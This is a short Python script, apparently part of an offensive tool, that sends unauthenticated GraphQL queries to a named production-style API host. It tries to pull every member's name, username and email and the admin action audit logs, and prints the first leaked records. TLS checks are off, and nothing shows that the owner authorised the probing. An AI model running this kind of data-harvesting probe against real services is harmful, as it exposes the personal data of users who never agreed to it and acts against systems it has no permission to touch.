import asyncio
import httpx
import json
from aura.ui.formatter import console

async def verify_pii_leak():
    url = "https://api-prod-test.indorse.io/graphql"
    console.print(f"[bold red][*] VERIFYING CRITICAL PII LEAK ON {url}[/bold red]")
    
    # Target 1: getAllMembers (PII)
    q1 = {"query": "query { getAllMembers { _id name username email } }"}
    # Target 2: adminActionsAuditMany (Internal Logs)
    q2 = {"query": "query { adminActionsAuditMany { _id action target details createdAt } }"}
    
    async with httpx.AsyncClient(verify=False, timeout=15) as client:
        # Check PII
        console.print("[*] Probing getAllMembers...")
        try:
            r1 = await client.post(url, json=q1)
            if r1.status_code == 200:
                data = r1.json()
                if "data" in data and data["data"].get("getAllMembers"):
                    console.print(f"  [bold red][!!!] CRITICAL: UNAUTHENTICATED PII LEAK (getAllMembers)[/bold red]")
                    console.print(f"    Preview: {json.dumps(data['data']['getAllMembers'][:3], indent=2)}")
                    return True
                else:
                    console.print(f"  [.] getAllMembers -> 200 but null/unauthorized.")
            else:
                console.print(f"  [.] getAllMembers -> {r1.status_code}")
        except: pass

        # Check Admin Logs
        console.print("[*] Probing adminActionsAuditMany...")
        try:
            r2 = await client.post(url, json=q2)
            if r2.status_code == 200:
                data = r2.json()
                if "data" in data and data["data"].get("adminActionsAuditMany"):
                    console.print(f"  [bold red][!!!] CRITICAL: UNAUTHENTICATED ADMIN AUDIT LEAK[/bold red]")
                    console.print(f"    Preview: {json.dumps(data['data']['adminActionsAuditMany'][:3], indent=2)}")
                    return True
                else:
                    console.print(f"  [.] adminActionsAuditMany -> 200 but null/unauthorized.")
        except: pass

    return False

if __name__ == "__main__":
    asyncio.run(verify_pii_leak())
